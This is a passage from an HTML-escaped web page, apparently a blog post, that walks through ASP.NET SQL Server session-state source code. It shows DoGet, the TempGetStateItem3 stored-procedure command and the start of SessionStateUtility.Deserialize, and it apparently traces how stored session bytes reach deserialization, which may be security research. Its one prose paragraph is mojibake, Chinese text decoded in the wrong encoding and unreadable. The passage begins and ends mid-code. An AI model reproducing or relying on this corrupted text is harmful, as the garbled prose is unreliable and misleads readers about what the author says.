            &lt;span class=&quot;n&quot;&gt;SessionIDManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CheckIdLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* throwOnFail */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlDataReader&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;MemoryStream&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlStateConnection&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGetExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_partitionInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AppSuffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @id&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @itemShort&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @locked&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockDate or @lockAge&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockCookie&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @actionFlags&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlExecuteReaderWithRetry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;nf&quot;&gt;ThrowSqlConnectionException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;cm&quot;&gt;/* Get short item */&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;MemoryStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_configCompressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;_rqOrigStreamLen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;DisposeOrReuseConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlStateConnection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDisposable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dbo.TempGetStateItem3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_sqlConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StoredProcedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandTimeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_commandTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;c1&quot;&gt;// ignore process of setting parameters&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥å¾ç¨‹å¼ç¢¼æ¸…æ¥šçœ‹å‡ºä¸»è¦æ˜¯å‘¼å« &lt;code class=&quot;highlighter-rouge&quot;&gt;ASPState.dbo.TempGetStateItem3&lt;/code&gt; Stored Procedure å–å¾— Session çš„åºåˆ—åŒ–äºŒé€²åˆ¶è³‡æ–™ä¸¦ä¿å­˜åˆ° buf è®Šæ•¸ï¼Œæœ€å¾Œå°‡ buf å‚³å…¥ &lt;code class=&quot;highlighter-rouge&quot;&gt;SessionStateUtility.DeserializeStoreData&lt;/code&gt; é€²è¡Œååºåˆ—åŒ–é‚„åŸå‡º Session ç‰©ä»¶ï¼Œè€Œ TempGetStateItem3 é€™å€‹ SP å‰‡æ˜¯ç›¸ç•¶æ–¼åœ¨åŸ·è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions&lt;/code&gt;ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“ Session æ˜¯å„²å­˜åœ¨ ASPStateTempSessions è³‡æ–™è¡¨çš„ SessionItemShort æ¬„ä½ä¸­ã€‚æ¥è‘—è®“æˆ‘å€‘ç¹¼çºŒå¾€ä¸‹çœ‹é—œéµçš„ DeserializeStoreData åšäº†ä»€éº¼æ¨£çš„æ“ä½œã€‚åŒæ¨£åœ°ï¼Œè¡Œæ•¸åå¤šï¼Œæœ‰éœ€æ±‚çš„æœ‹å‹è«‹è‡ªè¡Œä¸‹æ‹‰ XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionStateUtility&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SecurityPermission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerializationFormatter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
